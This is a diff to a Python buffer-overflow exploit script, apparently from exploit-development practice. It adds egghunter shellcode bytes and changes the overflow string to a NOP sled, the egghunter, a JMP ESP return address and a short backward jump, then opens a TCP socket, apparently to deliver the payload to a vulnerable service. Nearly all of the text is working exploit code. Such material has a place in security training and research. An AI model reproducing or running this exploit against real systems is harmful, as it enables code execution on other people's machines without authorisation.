@@ -15,11 +15,16 @@ JMP_ESP = "\xaf\x11\x50\x62"
 JMP_70_BACK = "\xEB\xB8" # Nasm Shell
 
 egghunter = b""
+egghunter += b"\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd"
+egghunter += b"\x2e\x3c\x05\x5a\x74\xef\xb8\x77\x30\x30\x74"
+egghunter += b"\x89\xd7\xaf\x75\xea\xaf\x75\xe7\xff\xe7"
 
 
 
 #evilString = cyclic_pattern
-evilString = "A"*70 + JMP_ESP + JMP_70_BACK + "C"*(256-4-7-4)
+#evilString = "A"*70 + JMP_ESP + JMP_70_BACK + "C"*(256-4-7-4)
+evilString = "\x90"*18 + egghunter + "\x90"*20 + JMP_ESP + JMP_70_BACK + "C"*(256-18-32-20-4-4)
+
 
 s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 
